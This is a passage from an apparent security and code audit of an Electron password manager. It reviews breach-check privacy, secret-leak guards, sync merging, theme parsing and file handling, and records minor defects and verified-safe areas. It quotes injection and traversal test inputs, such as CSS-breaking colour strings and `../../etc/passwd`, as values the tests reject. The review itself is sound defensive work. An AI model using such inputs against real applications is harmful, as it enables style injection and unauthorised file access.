rename to `MAX_RANGE_BODY_LENGTH`, or measure with `Buffer.byteLength(value, 'utf8')` and keep the
name. Match whatever S11 settles on.

---

### N37 — INFORMATIONAL · An empty password is reported as `badResponse`

`src/main/breach/client.ts:232`. The reason is correct in effect — never `safe` — and the docblock
explains the choice well. But `badResponse` is documented in `src/shared/model/breach.ts:65` as "A
4xx, or a body that is not a suffix list", and it crosses to the renderer unchanged through
`toBreachProjection`, so a user with an empty password field is told the server sent something
unreadable. `checkMany` avoids this by skipping empty passwords entirely, so the two paths also
disagree. **Fix:** add a `notApplicable` reason, or make `check('')` skip the same way `checkMany`
does. Worth settling before the dashboard writes copy against these reasons.

---

### N38 — INFORMATIONAL · The consent screen and global kill-switch that `breach/` is supposed to sit behind do not exist

**STATUS: half FIXED.** The **kill-switch exists** — `src/main/network-policy.ts` plus the machine-scoped `Preferences.networkAllowed`, off by default, fail-closed on anything that is not the literal boolean `true`, and ANDed with the vault's own setting in `allowsBreachCheck` so no call site writes the conjunction itself. The grep quoted below now returns hits. Decision D23 carries the argument. **Still absent:** the consent screen, any UI control for `networkAllowed` (it is writable over `kh:settings:update-machine` and nothing renders a toggle, so today it is reachable only by editing `preferences.json`), and the composition root that would construct a transport for the policy to gate.

Hard rule 5 says the HIBP check is "off by default, **behind a global network kill-switch**", and
`docs/02-Security/01-Process-Hardening.md:95` says the same. **Measured:** a grep for
`killSwitch`, `kill-switch`, `networkEnabled`, `allowNetwork`, `offlineOnly` and `networkAllowed`
across `src/` returns nothing. `01-Doc-Code-Audit.md:245` recorded the same absence and
`PRIVACY.md` has already been corrected to say so. Recorded here because it is a **prerequisite for
wiring `breach/`**, not a defect in `breach/`: the client's structural off-by-default is genuinely
strong, but it is one switch and the rule asks for two.

---

### N39 — INFORMATIONAL · Everything else, recorded so it is not rediscovered

**Guard-tooling gaps with no current violation.**
`tools/no-hardcoded-colours.test.ts:64` — `COLOUR_PATTERN` does not match named CSS colours or the
modern `oklch()`/`lab()`/`lch()`/`hwb()`/`color()`/`color-mix()` forms; I swept `src/` for all of
them and the only hits are five uses of `transparent`, which is legitimate. `:96-98` —
`definesToken` exempts any line matching `^\s*--kh-[\w-]+\s*:` **anywhere**, so a component
stylesheet could define `--kh-danger-fg: #ff0000` locally and be exempt from this guard while also
being invisible to the contrast guard, which reads `src/shared/theme/themes.ts`; I swept for
`--kh-*` colour definitions outside `src/shared/theme/` and none exist. **Fix:** add the modern
forms and a named-colour list to the pattern, and restrict `definesToken`'s exemption to paths
under `src/shared/theme/`.

**Main process.**
`shell-controller.ts:182-194` — `start()` is not idempotent: it overwrites `#stopPowerWatch`
without calling the previous handle and calls `#createTrayIfWanted()` without checking
`#tray !== null`, so a second `start()` without an intervening `dispose()` leaks four
`powerMonitor` listeners and an orphaned `Tray`. ·
`index.ts:62-95` — `window.show` and `window.hide` render enabled and do nothing: both are in
`AVAILABLE_MENU_COMMANDS` with no case in `runMenuCommand`, so both fall to `default:` and a
`console.warn`, which is the failure `menu-commands.ts:23-25` says the design prevents. Latent
because no tray is created. In-flight work. ·
`src/main/theme/` has **no hardening guard**, while `shell/` ships one asserting no window
creation, no vault access and no network — despite `theme-dialogs.ts` importing Electron and the
module handling untrusted file content. ·
`keeptheme-file.ts:117` — no directory fsync after `rename`; a stated scope omission rather than an
oversight, and low stakes for a colour file. ·
`totp/index.ts:28` re-exports `hmacOtpSecretCode` and `totpWindowAt` without their own validation;
every in-module caller validates first, so no live defect, but an outside caller passing
`periodSeconds: 0` to `totpWindowAt` gets `counter: Infinity` rather than a `TotpError`. Worth
knowing before the IPC handler is written. ·
`totp/base32.ts:130` allocates proportionally to an uncapped input — linear, no ReDoS, and the
input is a file the user chose to import, but a `MAX_SEED_CHARACTERS` check before the allocation
would cost nothing (a real seed is 16–64 characters). ·
`totp/base32.ts:140,157` abandon partially-decoded seed bytes unzeroed — **recommendation: no
action.** The input string is an unzeroable JS string that outlives the call regardless, so zeroing
the partial buffer buys essentially nothing. Recorded so nobody spends time on it. ·
`activity/session-activity.ts:112` uses `Date.now()` directly while every stored entry goes through
`ActivityLog`'s injectable `#now`; test ergonomics only. ·
`sync/merge-record.ts:651` and `merge-history.ts:127` pull against each other — the merge takes the
_larger_ retention cap because "keeping more history destroys nothing", but a version present in
the ancestor and missing from one side is treated as deleted, and that comment says it covers
"ordinary retention pruning". Both sites document their behaviour; they read as contradictory held
together. A sentence in the docs, not a code change. ·
`sync/merge-record.ts:443` — one bad record aborts the whole merge, since `mergeDocuments` has no
`try`/`catch`. Correct as "fail loudly rather than write bad data"; the caller should run
`diagnose()` first and surface the per-record issue. ·
`sync/merge-record.ts:539-548` — an ordinary one-sided deletion produces no note, only
`counts.trashed`/`counts.updated`, which is in tension with the "a merge is never silent" framing. ·
`sync/merge-history.ts:145` — `mergeVersions` picks a numbering by argument position when both
sides match, because `identityOf` excludes `versionNumber`: `merge(a,b)` yields `[1,2]` where
`merge(b,a)` yields `[1,7]`. No data is lost, but it contradicts the file's own commutativity claim;
**fix** by breaking the tie with `canonicallyFirst`, already used for this at `merge-values.ts:216`. ·
`sync/merge-record.ts:258` applies `sortCustomFields` unconditionally, so a merge that touched a
different field rewrites sparse `order` values (`[0, 7]` → `[0, 1]`) and, with `mergeOrigin` set,
writes a merge version claiming the custom fields changed; **fix** by skipping the sort when
`sameValue(chosen.value, oursValues.custom)`. ·
Three distinct constants named `MAX_TAGS` — `tag-ops.ts:60` = 500 (per vault),
`vault/credential-ops.ts:40` = 64 (per record), `shared/ipc/credential-validation.ts:40` = 64 (the
same rule, second copy). The first pair is deliberate and documented; the second is S14, already
guarded by `tools/limit-parity.test.ts`. ·
`breach/https-transport.test.ts:283-287` puts an assertion inside a `.catch` with no
`expect.assertions(n)`, so it could not fail if the promise resolved — harmless, since `:279-281`
already asserts the rejection, but the pattern is worth not spreading.

**Renderer.**
`settings/use-settings.ts:129-134` and `import/ImportWizard.tsx:103-109` render and speak main-process
error messages verbatim, relying entirely on the documented "`IpcFailure.message` is scrubbed"
invariant (`import/gateway.ts:50-56`). That is the right layering, but a non-`IpcResult` `Error`
thrown anywhere in the promise chain — a `TypeError`, a JSON parse failure carrying a fragment of
input — reaches the same `error.message` path and is both painted and read aloud. No such thrower
found in scope; worth a comment naming the dependency. ·
`import/ImportWizard.tsx:135-141` subscribes to progress even while closed (no `if (!open) return`,
unlike the format-registry effect directly above); the unsubscribe _is_ returned, so this is not a
leak, just an IPC listener held for the lifetime of whatever mounts the wizard. ·
`commands/use-shortcuts.ts:100-101` describes two guards ("a key that is only a modifier… `Dead`
arrives mid compose-sequence") above `if (event.repeat) return;`. The behaviour is nonetheless
correct — `matchesEvent` compares against a table containing no modifier names and no `Dead` — but
the comment sits above the wrong line. ·
`organisation/test-fixtures.ts:23` defaults `colour = 'neutral'`, which is not a `TagColour` but the
_display label_ for `'text-muted'` (`tag-colours.ts:60`); `Tag.colour` is typed `string`, so there
is no compile error and `resolveTagColour` silently coerces it, meaning any future tag-colour test
built on this fixture would exercise the fallback while appearing to exercise the happy path. Use
`'text-muted'`. ·
`theme-studio/theme-draft.test.ts:212-237` asserts only inside `if (changed)`, so a refactor making
every action a palette no-op would pass vacuously. One line fixes it: assert at least one action in
the table changed a colour. (The surrounding suite is genuinely strong.) ·
The score→tone map is duplicated between `export/PassphraseStrength.tsx:23-28` and
`onboarding/StrengthReadout.tsx:29-34` (and a third copy in `CreateVaultScreen`, out of scope).
**Both files already record the duplication and name the fix** (lift a shared `StrengthMeter` into
`components/`), so this is documented debt, not an unnoticed violation of hard rule 8.

---

## Checked, and found fine

Recorded so nobody re-investigates these, and so nobody "fixes" one of them into a defect.

### `breach/` — the network module, swept end to end

- **The k-anonymity boundary is exactly five hex characters and is structural, not conventional.**
  `RANGE_PREFIX_LENGTH = 5`; `rangePrefix` slices `0..5`; `PREFIX_PATTERN` is `/^[0-9A-F]{5}$/` and
  is re-checked inside the transport even though the caller generated the value;
  `BreachTransport.fetchRange` takes a prefix and an `AbortSignal` **and nothing else**, so no
  implementation — including a hostile one substituted by a compromised dependency — can be handed
  more than twenty bits. `sha1Hex` is deliberately not exported.
- **Off-by-default is the absence of the capability, not a flag.** `#transport` is `null` unless one
  is passed; there is no lazy import, no default construction, no fallback. With no transport
  `check()` returns `unknown`/`disabled` **without hashing the password at all**, and
  `no-network.test.ts:308-316` spies on `passwordRange` and `rangePrefix` to prove it — the
  difference between a feature that is off and one that is merely quiet.
- **No code path reaches a real request without an injected transport.** Measured: nothing outside
  `src/main/breach/` imports `https-transport.js`, `createHttpsTransport` or
  `PwnedPasswordsClient`; there is no `src/main/breach/index.ts` barrel to re-export them; there is
  no `kh:breach:*` channel among the 58 handlers.
- **No malformed or partial response can read as "not breached".** `parseRangeBody` is strict by
  construction: one unparseable line rejects the whole body, an empty body is `empty` rather than
  "no matches", an over-cap body is `oversized`, and all three map to `unknown`/`badResponse` at
  `client.ts:340-343`. A body truncated by a mid-stream network error throws out of
  `readCappedText`, is caught at `#fetchOnce:392`, and is classified `offline`/`timeout` — also
  `unknown`. `classifyStatus` treats **only** 200 as an answer. Counts are capped at 15 digits so a
  400-digit count cannot become `Infinity` and then a verdict. A padding row with count `0` is
  correctly not a match. I looked specifically for a path from a failure to `safe`; there is none.
- **The `Add-Padding` header is genuinely sent, and the test genuinely checks it.**
  `https-transport.ts:127` sets it on every request, and `https-transport.test.ts:82-88` asserts it
  against the **exported constant** rather than a second copy of the string, on the object the
  stubbed `fetch` actually received. The reasoning in the header is correct: without padding,
  response size leaks which prefix was requested through TLS.
- **Nothing is persisted.** The range cache is an in-memory `Map` bounded at 128 with
  insertion-order eviction. No breach flag is written to disk, no result stored, no hash kept.
  `no-network.test.ts:224-230` asserts no file in the directory names `node:fs`, `writeFile`,
  `app.`, `localStorage` or `PreferencesStore`. (The one obligation left is N15.)
- **No password, hash, suffix or prefix reaches a log or an error.** There is no `console.*` in the
  directory and `no-network.test.ts:217-221` enforces that. The transport's one error names the
  expected shape and never the value (`https-transport.ts:120`), asserted at
  `https-transport.test.ts:276-288`. `#fetchOnce`'s catch converts whatever the transport threw into
  a member of a **closed union**, so no message, stack or `cause` can carry a prefix out — and
  `client.test.ts:534-547` fault-injects a transport whose error message literally contains `5BAA6`
  and asserts it does not appear in the summary. That is a real guard.
- **The property test is not vacuous.** `client.test.ts:512-533` plants six real distinctive
  passwords — including a Unicode one and an emoji one — computes each one's real prefix and suffix,
  and asserts the serialised summary contains none of the password, the suffix, the full digest, or
  **the prefix**. `:549-558` additionally pins the result to exactly four keys, so a new field cannot
  ride along.
- **The rest of the request shape is right and is asserted on the object `fetch` received:** `GET`,
  no body, one fixed origin with no user-built path, `redirect: 'error'`, `credentials: 'omit'`,
  `referrer: ''`, a version-free `User-Agent` (asserted to contain no digit and not to match
  `electron|node|chrome`), and the caller's signal passed through by identity. Node's `fetch` keeps
  no HTTP cache, so the absent `cache: 'no-store'` is correct rather than missing, and undici does
  not honour `HTTP_PROXY` by default, so there is no ambient-proxy path either.
- **`parseRetryAfterSeconds` is careful in the way that matters.** It clamps at both ends, rejects
  anything not starting with a letter before handing it to `Date.parse` — with a comment correctly
  noting that `Date.parse('-5')` is March 2001, i.e. in the past, i.e. "retry now" — and caps at 60
  seconds so a hostile header cannot park a sweep.
- **Rate limiting is honoured once and then stops the run.** One retry at the service's own
  interval, no third attempt, and `MAX_CONSECUTIVE_FAILURES = 3` stops a doomed sweep instead of
  grinding 3,000 requests at ten seconds each. Deduplication by prefix is real and is what makes a
  3,000-record vault a few hundred requests.
- **The exact corpus count does not cross the bridge.** `toBreachProjection` reduces it to one of
  four bands, and the reasoning in `breach.ts:112-125` is correct: an exact count is very nearly a
  fingerprint. `BreachReport` reports `breached`/`safe`/`unknown` separately and derives none of them
  by subtraction. `src/shared/model/breach.ts` is types and constants only — no logic, no Node import
  — so compiling it into the renderer bundle grants the renderer nothing.

### The secret boundary in the new subsystems

- **`sync/` conflict reports carry no values.** Every record-field conflict side goes through
  `fieldSide` (`conflict-projection.ts:45`) → `toDiffProjection` → `projectSide`
  (`diff-projection.ts:59`). `password`/`notes` become `{kind:'secret', length}`; security questions
  become `{id, question, hasAnswer}`; custom fields run `isCustomFieldValueSecret` per entry. No
  truncation, no prefix, no hash, no length-plus-first-characters. There is no spread of a
  `Credential` or a `FieldDiff` into a conflict — `recordFieldConflict` (`merge-record.ts:451`)
  builds every key explicitly. `plainSide` is used only for `trashedAt`, attachment **ids** (never
  names or sizes), `history.enabled`/`maxVersions`, folder name/parentId/order, tag name/colour, and
  settings scalars.
- **No digest of a secret escapes `sync/`.** `canonical()` (`stable-value.ts:32`) is applied to
  secret material in `sameValue`, `canonicallyFirst` and `identityOf`, and in all three the
  serialisation stays local: `sameValue` returns a boolean, `canonicallyFirst` returns one of its
  _inputs_, and `identityOf`'s output is only ever a `Map` key or a sort key.
- **`sync/`'s property fixture is one of the best in the repository.** `markedRecord`
  (`properties.test.ts:363-386`) plants a long distinctive marker in **every** position it guards —
  `password`, `notes`, a security-question `answer`, a `pin`-typed custom value, a `hidden` custom
  value, and a historic snapshot password — includes a deliberately non-secret custom field carrying
  no marker, and adds explicit non-vacuity assertions that conflicts were actually raised (`:403`),
  that a secret side was actually produced (`:404`), and that the markers really are in the merged
  document (`:406`).
- **`activity/` has no field a secret could be assigned to.** An entry holds `seq`, `at`, `kind`,
  `subjectId` (a UUID), `vaultLabel`, `count`, `secretKind`, `lockReason`, `unlockMethod`. No title,
  no username, no password, no note body, no search query, no file path, not even a length. It is
  **never persisted** — an in-memory ring with deliberately no serialiser (`activity-log.ts:30-33`)
  — so the atomic-write and `0o600` questions do not arise. It is **cleared on lock**, including the
  lock entry itself, with `#buffer.fill(undefined)` rather than an index reset. Bounded at 500 with
  `totals` and `droppedCount` tracked separately. The privacy gate is applied **at capture via an
  allow-list**, not at display and not via a spread. And its no-secrets test is the opposite of
  vacuous: `activity-log.test.ts:217` plants a marker both as an unmodelled extra field
  (`revealedValue`, `notes` — what a `{...input}` spread would carry through) and as a legitimate
  field at privacy level `none`, and asserts it appears nowhere. `vaultLabel` is
  `basename(path).replace(/\.keep$/i, '')`, so it carries no OS username.
- **`activity/vault-statistics.ts`'s input type _is_ the guard.** `StatisticsRecord` is a
  deliberately narrow structural subset of `CredentialProjection`; `title`, `username`, `email`,
  `urls`, `custom`, `securityQuestions` and — the interesting omission — `passwordLength`/
  `notesLength` are all absent by construction. No aggregate, bucket, "top" list, label or tooltip
  carries secret material; attachments contribute `size` only (`:34`, "never a name, never a MIME
  type, never bytes"). `vault-statistics.test.ts:403-443` is genuine: it plants a marker in ten
  fields plus real lengths and asserts `JSON.stringify(stats)` contains none, with a separate case
  for `id` and a third asserting no key matching `passwordlength` survives.
- **`totp/` never echoes a seed.** Every factory in `totp/errors.ts` composes fixed prose plus a
  caller-written literal `problem`; none interpolates its input. `uri.ts:108-111` deliberately
  **drops** the `URL` constructor's cause, because `URL` quotes its input and for an `otpauth:` link
  that input contains the seed — and `errors.test.ts:79-84` is a source-level guard keeping it
  dropped, with `:62-77` sweeping every non-test file for `new TotpError(… cause: …)`. The one thing
  an error emits is a 1-based character _position_ (`base32.ts:141`), which fires only on an invalid
  seed. `base32.test.ts:159-182` and `uri.test.ts:208-225` slide a 4-character window across the seed
  and assert no fragment appears in the message.
- **`organisation/` errors carry ids and counts only.** All ten factories read. `integrity.ts`
  messages carry ids and counts; names travel in a dedicated structured `name` field for the two
  duplicate checks where the name _is_ the finding, and `integrity.test.ts:199-235` plants
  distinctive fixture strings (`HouseDeposit`, `SwissBankLogin`, `Divorce`, `Offshore`) and asserts
  none appears in any message.
- **`attachments/errors.ts` carries only limits, sizes, chunk ids and record ids** — no filename, no
  path, no byte. The `no-leak.test.ts` error-message sweep is genuinely non-vacuous: all ten cases
  plant `HOSTILE_NAME` (with its directory), `HOSTILE_BYTES` and/or `HOSTILE_DIGEST` in the position
  the assertion guards. (The one gap, N28, is about coverage rather than the fixture.)
- **`document-diagnosis.ts` is right everywhere except N2.** It deliberately enumerates duplicates
  itself rather than borrowing `assertValidCredential`'s message (which interpolates a user-authored
  _label_), and swallows that message entirely at `:221-225`. `toOrganisationFinding` explicitly
  drops `name`, with a compile-time-total `Record<OrganisationIssueKind, …>` so a new kind is a
  build error.

### The renderer's secret handling

- **`export/`** — `ExportDraft.secretPassphrase` and `passphraseRepeat` live only in
  `useExportDialog`'s `useState`, and `ExportDialog.tsx:39` genuinely unmounts the body on close, so
  destruction is structural rather than a remembered `reset()`. `chooseFormat`
  (`use-export-dialog.ts:178-192`) also clears both on a format change. `ExportPreviewRequest`
  structurally cannot carry a passphrase (`export-gateway.ts:30-36`), and
  `ExportDialogBody.test.tsx:429-450` asserts every preview request has exactly the keys
  `['format','scope']`. `export-presentation.ts` never receives a record, a projection or a secret —
  only `ExportLoss`.
- **`import/` never receives a secret at all.** `ImportRecordPreview` carries
  `passwordLength`/`notesLength` only; `SecretMask` takes a `number` (`SecretMask.tsx:19-26`) with no
  prop that could accept a value; `RecordPreviewTable`, `DuplicateGroupList` and `ReviewStep` render
  only the safe projection; `duplicate-decisions.ts` never touches a value —
  `mergeReplacesPassword` reads `field.effect === 'replaces'`, never two passwords side by side. No
  warning or error path echoes a field value: `WarningLocation` renders only `column` and `line`, and
  `mapping-validation.ts` messages are static strings plus the column _header_.
- **`import/test-fixtures.ts:39-47` + `ImportWizard.test.tsx:95-119` is the strongest guard in the
  renderer.** Seven distinctive sentinels (password ×4, note body, TOTP seed, security answer) are
  planted into `ParsedRecordLike` and projected through the **real** `previewRecord`; the test then
  sweeps `textContent`, every attribute and every live form `.value` at every step, **with positive
  controls** (`AC-11924`, `Google`) so the sweep cannot pass on an empty DOM. `:202-218` additionally
  sweeps the serialised IPC payload.
- **`onboarding/`** deliberately holds nothing typed: `FirstCredentialDraft.secretPassword` is passed
  to the host and dropped (`FirstCredentialStep.tsx:57-67`), and `MasterPasswordStep.submit` clears
  both fields on success (`:129-131`). `OnboardingFlow.test.tsx:213-255` plants a marker in every
  input on both input-bearing steps, asserts against **all** of `localStorage`, and checks the marker
  really reached the fields (`:224`).
- **`commands/recent-commands.ts` still persists nothing** — in-memory Zustand only, storing opaque
  `command:`/`credential:` keys and never objects, cleared on the unlocked→not-unlocked transition
  via a store subscription (correctly, not an effect body). `recent-commands.test.ts:60-80` plants
  `credential:my-bank` and walks both Storage objects with `key()`/`getItem()` — explicitly not a
  spread, with a comment saying why. `palette-store.ts` holds two booleans and a `Platform`. The
  palette has no reveal and no copy path: `command-registry.ts` deliberately omits a copy-password
  command even though the shortcut table has that binding (guarded at
  `shortcut-registry.test.ts:238`), and `CommandsProvider.tsx:199-204` routes
  `credential.copyPassword` through a `SecretRef` over IPC.
- **`organisation/drag-payload.ts`** puts only an **id** on the `DataTransfer`, under
  Keyhold-namespaced MIME types so a drag from another app cannot be mistaken for a record — kind in
  the type (readable during `dragover`), id in the data (read once in `drop`). Correct handling of
  protected mode.
- **Browser storage, exhaustively.** `onboarding-storage.ts:144-160` names all six fields, spreads
  nothing, wraps every access in `try`, rejects the tampering that matters (`completed` without
  `acknowledgedNoRecovery`), clamps the resumed position, re-scopes and clears the old key on move,
  and percent-encodes so `a.b` and `a%2Eb` cannot collide. `organisation/expansion-storage.ts` writes
  **folder ids only, never names**, scoped per vault, capped at 10,000, treating storage as hostile —
  the `globalThis.localStorage` _property access_ itself is wrapped, because browsers configured to
  block site data throw there rather than on the call. **Nothing in `settings/` writes to any web
  storage at all.** So: no folder or tag name is ever written outside the encrypted vault; the only
  thing an attacker with the profile directory learns from that key is _how many_ folders a vault has
  and which ids were expanded. (`keyhold.appearance` is N13 — a different problem, and it holds no
  vault content either.)

### Electron surface added by `shell/` — clean, verified by reading rather than by trusting the guard

- **No `new BrowserWindow`, no `WebContents` construction, no `loadURL`/`loadFile`, no
  `executeJavaScript`, no `setWindowOpenHandler`, no `webviewTag`, no `session`/`webRequest`
  access** anywhere in `shell/` or `theme/`. `HARDENED_WEB_PREFERENCES` cannot be bypassed because
  nothing here has a window to bypass it with.
- **No `shell.openExternal` anywhere in scope** — the S1/S2 class has not been reintroduced.
  `security.ts:112-122`'s `openExternally` remains the sole scheme-checked exit, and the hardened
  handler at `security.ts:141` is not shadowed. The `window.ts:77-81` comment explaining why there
  must not be a second handler still holds.
- **No spawning of any kind:** no `spawn`, `exec`, `execFile`, `child_process`, `shell.openPath`,
  `shell.showItemInFolder`, `shell.trashItem` in any of the nine subsystems. The S5
  bare-program-name class does not apply — there is nothing to name.
- **No protocol-handler registration**, no `setAsDefaultProtocolClient`, no `protocol.*`, no
  `commandLine.appendSwitch`, no `globalShortcut`. `applyWebContentsHardening` is still reached for
  every WebContents via `index.ts:124-126`.

### What the tray and menu expose while locked — the strongest part of `shell/`

- The tray surface is exactly three items in every one of its four states: one of Show/Hide,
  `Lock Vault` (disabled when locked), and `Quit`. The tooltip is `"<appName> — locked"` or
  `"<appName> — unlocked"` and nothing else. No credential title, no username, no vault path, no
  record count, no recents list, no quick-copy.
- The `tooltip-leak` guard is genuinely non-vacuous **and its history is documented**:
  `tray-model.test.ts:105-125` records that the naive form (comparing the tooltip against the
  function that produced it) _survived fault injection_, and pins the format against a
  deliberately-not-the-app-name string instead.
- `menu-commands.test.ts` pins both security classifications by name (`MUST_BE_LOCKED`,
  `MUST_BE_CREDENTIAL_EXPOSING`) in **both directions**, with a documented fault-injection rationale
  — flipping `vault.export`'s `needsUnlockedVault` to `false` fails the file. This is not the
  "assert the configuration object" pattern that produced S1.
- Role-based items (`cut`/`copy`/`paste`/`selectAll`/`about`/`zoom`/`minimize`) are correctly not
  lock-gated and disclose nothing: Chromium refuses `copy` from `<input type=password>` and the macOS
  About panel reads Info.plist. `reload`/`forceReload`/`toggleDevTools` are `isPackaged`-gated
  (`menu-model.ts:252-259`), matching `security.ts:152-156`.
- **No window title is set anywhere in `src/main`** (measured: zero `setTitle` hits), so no
  credential or path can reach it. Every menu label is a static string in the catalogue.

### `.keeptheme` and the theme studio — CSS injection is genuinely closed

- Every accepted colour is re-serialised from parsed RGB channels to `#rrggbb` by
  `normaliseColour`/`toHex` (`src/shared/theme/keeptheme.ts:116-164`).
  `keeptheme-format.test.ts:281-295` explicitly rejects `url(https://…)`, `var(--kh-color-bg)`,
  `calc()`, `color-mix()`, `linear-gradient()`, `expression()`, `red; background: url(http://x)`,
  `#fff}body{display:none` and `rgb(0,0,0);}`. **A theme _file_ cannot reach the network or break the
  CSP.** (The gap is the persistence read path, N13 — a different door.)
- The parse is bounded three ways: a 64 KB `stat` before the read (`keeptheme-file.ts:56`), a 64 KB
  character check before `JSON.parse` (`keeptheme.ts:651`), and 32/80/240-character caps per colour,
  name and description with control-character rejection. Palette iteration is over the fixed
  `COLOUR_TOKENS` list, so key count cannot drive work.
- `suggestKeepThemeFileName` is tested against `../../etc/passwd` and `C:\Windows\System32` and can
  never emit a separator; `theme-dialogs.ts:52` additionally wraps it in `basename`.
  `readKeepThemeFile` and `importKeepTheme` return generic messages and only `basename(path)`, with a
  test at `keeptheme-file.test.ts:71-78`.
- `ThemePreview.tsx:32-39` scopes the draft palette to its own subtree via a React `style` object,
  never `documentElement`, so a wrecked draft cannot take away the contrast report or the way out.
  `theme-draft.test.ts`'s `acknowledgedDraft()` asserts its own fixture actually fails AA before using
  it — the anti-vacuity check, done unprompted. `token-groups.test.ts` asserts the editor's grouping
  covers `COLOUR_TOKENS` exactly once each, a genuine hard-rule-8 guard.
- `theme-file-bridge.ts` **does** bound what it reads: the browser path checks
  `file.size > KEEPTHEME_MAX_BYTES` _before_ calling `text()`, and the native path relies on a
  main-side `stat`. Seven malformed-payload shapes plus the size cap are covered.

### Power, lock and session behaviour

- `power-events.ts` correctly **only observes**. `src/main/session/auto-lock.ts:91,99` is the single
  registrar for `suspend` and `lock-screen`, gated by `lockOnSleep`/`lockOnScreenLock` (both default
  `true`), plus a 10-minute OS-idle poll. There is no resume path that leaves the vault unlocked —
  `resume`/`unlock-screen` only trigger `refresh()` and `notifySessionChanged`, which is right;
  locking on resume would be locking after the fact.
- The minimise/hide-to-tray gap is identified and closed: `hide()` fires neither `minimize` nor
  `blur`, which is why `lockOnHideToTray` exists and defaults `true` (`shell-settings.ts:29-38`),
  with the idle timer as a backstop. A deliberate, settings-exposed trade-off per D10.
- `coerceShellSettings`' lockout correction (`shell-settings.ts:68-70`) is tested across all sixteen
  boolean combinations, including an explicit assertion that it never touches `lockOnHideToTray`.

### Filesystem, bounds and arithmetic

- **Neither `attachments/` nor `recovery/` performs any I/O.** A grep for `node:fs`, `readFile`,
  `writeFile` and `fs.` across both directories returns zero hits; the only `node:` import is
  `basename` from `node:path`. Both are pure functions over bytes handed in by a caller. So the
  path-traversal, non-atomic-write, delete and `0o600` questions do not arise _in that scope_.
- **`recovery/file-inspection.ts` is solid.** The `Cursor` (`:64-94`) is bounds-checked and returns
  `null` rather than throwing on every path. `chunkCount * CHUNK_MINIMUM_BYTES` (`:451`) cannot
  overflow — the maximum is ≈2.06e11, well under `MAX_SAFE_INTEGER`. `bodyLength` is bounded against
  both `MAX_BODY_BYTES` and `SEALED_MINIMUM_BYTES` before the read (`:379-411`), and `declaredLength`
  both ways before each chunk read (`:513`). `file-inspection.test.ts:327-343` exhaustively walks
  every truncation prefix and asserts `structurallyIntact === (stoppedAt === null)`.
  `summariseHeader` (`:117-141`) reports salt, wrapped-DEK nonce, ciphertext and tag as **byte
  lengths only**, with the test asserting both the absence of the value and the absence of the `salt`
  key.
- **`attachments/digest.ts`:** `digestsMatch` uses `timingSafeEqual` with a length pre-check.
  `assertAttachmentIntegrity` (`audit.ts:150`) checks `bytes.length !== meta.size` **and** the digest,
  and throws rather than returning a boolean — the right choice for a check callers forget.
- **`attachments/references.ts` refcounting is correct on every path traced.** `chunkIdsOrphanedBy`
  (`:83-100`) subtracts the record's own held count before comparing to zero, so a chunk shared with
  another record survives a purge; `removeAttachment` (`store.ts:274`) takes the count _before_
  removal and compares to 1; trashed records deliberately count as referrers (`:20-27`), guarded at
  `store.test.ts:162-171` and `audit.test.ts:107-113`. No refcount bug found.
- **`attachments/store.ts` chunk ids are random, not content-derived** (`:40-55`), and the reasoning
  is right: chunk ids sit in plaintext before each sealed chunk, so a content-addressed id would be
  an offline fingerprint oracle against a _locked_ vault. **Do not "simplify" this into content
  addressing.** Secret-bytes ownership is handled on all four paths (`:126-135`, `:158`, `:190`,
  `:314-318`), tested at `store.test.ts:288-357`.
- **`attachments/limits.ts`** validates at point of use rather than at the edit field, correct given
  settings travel inside the vault, and the `maxAttachmentBytes > MAX_CHUNK_BYTES` check genuinely
  prevents writing a chunk this app's own reader would refuse — a total vault lockout.
- **`attachments/filename.ts` traversal handling** (aside from N25): `PATH_SEPARATORS` is greedy over
  both separators regardless of host platform, `WINDOWS_PREFIX` catches a bare `C:`, ADS colons are
  caught by `ILLEGAL_CHARACTERS`, reserved device names are escaped by stem (and `console.txt`
  correctly is not), `..`/`.`/`""`/whitespace all reach `FALLBACK_ATTACHMENT_NAME`, and truncation
  cuts on whole code points with a lone-surrogate assertion. **The decision to _flag_
  `invoice.pdf.exe` rather than rename it is well reasoned and should not be "fixed" into a rename.**
- **`attachments/sniff.ts` other than N8** is genuinely bounded — a fixed table, the furthest read at
  offset 12, nothing parsed or decompressed — the multi-part WebP signature correctly requires both
  markers, `normaliseMimeClaim` rejects CRLF injection and over-long values, and the deliberate
  absence of SVG and HTML from the registry is correct.
- **`recovery/repair-plan.ts` cannot destroy data.** It is a pure data producer, and **nothing
  anywhere takes a `RepairPlan` and executes it** — there is no apply function to misapply to a
  misdiagnosed file. `copy-everything-aside` is unconditionally unshifted as step 1 whenever there is
  any step 2 (`:338-350`), which is the mandatory-backup requirement. Every `reversible: false` draft
  carries a non-null `cannotRecover` (`repair-plan.test.ts:159-173`). `remove-unreferenced-chunks` is
  deliberately last. Ordering, determinism and non-mutation are all tested.
- **`recovery/survey.ts` ranking:** `compareCandidates` is a total order, generation deliberately
  outranks mtime with a written reason, and `soundnessTier` puts "not inspected" between "sound" and
  "damaged" — all three tested. `.tmp` is never deleted. `escapeForRegExp` correctly escapes the vault
  name before building the backup regex, so a vault named `v.keep` cannot match `vXkeep.bak.1`.
- **`recovery/text.ts`'s `formatCount` and `wrapText` are correct**, deliberately unlocalised with a
  guard test that constructs a German `Intl.NumberFormat` and asserts divergence, and `wrapText`
  returns `['']` rather than `[]` for empty input so a caller cannot silently drop a paragraph.
- **`recovery/test-support.ts`** builds damaged fixtures by breaking a real `writeContainer` output
  rather than hand-assembling bytes, with every offset derived from the container. That is why
  `file-inspection.test.ts` is trustworthy.

### `sync/` correctness, aside from N3, N14 and the notes in N39

- **Determinism is clean.** Zero occurrences of `Math.random`, `Date.now` or `new Date(` in the whole
  of `src/main/sync/`. `options.now` is used only for `report.generatedAt`. Every sort is either an
  explicit comparator or a default `.sort()` on strings (UTF-16 code-unit order, not
  locale-sensitive); `localeCompare` appears nowhere. `Object.keys(...).sort()` in `canonical` makes
  the serialisation key-order-independent. `canonicalIndexById` (`merge-collections.ts:70`) correctly
  defends the resurrection pool against concatenation order.
- **Records are not lost by any other mechanism.** The `surviving` loop
  (`merge-document.ts:129-167`) iterates the union of base ∪ ours ∪ theirs, and the only path that
  drops an id requires absence from _both_ sides plus presence in the ancestor. A record is never
  dropped for being trashed. `orderIds`' fallback branch (`merge-values.ts:220-229`) emits `ordered`
  plus every remaining surviving id. Records with equal, missing, zero or `NaN` `updatedAt` cannot
  cause loss, because no timestamp participates in any survival or content decision —
  `merge-values.ts` looks at no clock at all, and `mergeMeta` runs strictly after the content decision
  using only `min`/`max`.
